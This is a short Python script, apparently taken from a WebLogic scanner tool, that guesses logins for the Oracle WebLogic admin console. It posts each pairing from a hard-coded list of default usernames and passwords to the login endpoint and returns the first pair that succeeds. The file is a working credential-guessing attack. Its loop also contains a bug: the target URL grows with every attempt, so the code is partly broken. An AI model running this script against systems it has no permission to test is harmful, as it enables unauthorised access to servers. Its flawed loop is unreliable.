# https://github.com/rabbitmask/WeblogicR
import requests

headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0'}
pwddict = ['WebLogic', 'weblogic', 'Oracle@123', 'oracle@123', 'password', 'system', 'Administrator', 'admin',
           'security', 'joe', 'wlcsystem', 'wlpisystem']


def poc(url):
    """weak password"""
    if '://' not in str(url):
        url = 'http://' + url

    furl = url + '/console/login/LoginForm.jsp'
    try:
        freq = requests.get(furl, headers=headers, timeout=5, allow_redirects=False)
        if freq.status_code == 200:
            for user in pwddict:
                for pwd in pwddict:
                    data = {
                        'j_username': user,
                        'j_password': pwd,
                        'j_character_encoding': 'UTF-8'
                    }
                    try:
                        url = url + '/console/j_security_check'
                        req = requests.post(url, data=data, headers=headers, allow_redirects=False, timeout=8,
                                            verify=False)
                        if req.status_code == 302 and 'console' in req.text and 'LoginForm.jsp' not in req.text:
                            result = '目标WebLogic发现弱口令: %s username %s password: %s' % (url, user, pwd)
                            return result
                        # else:
                        #     return 'weak'
                    except:
                        pass
    except:
        pass
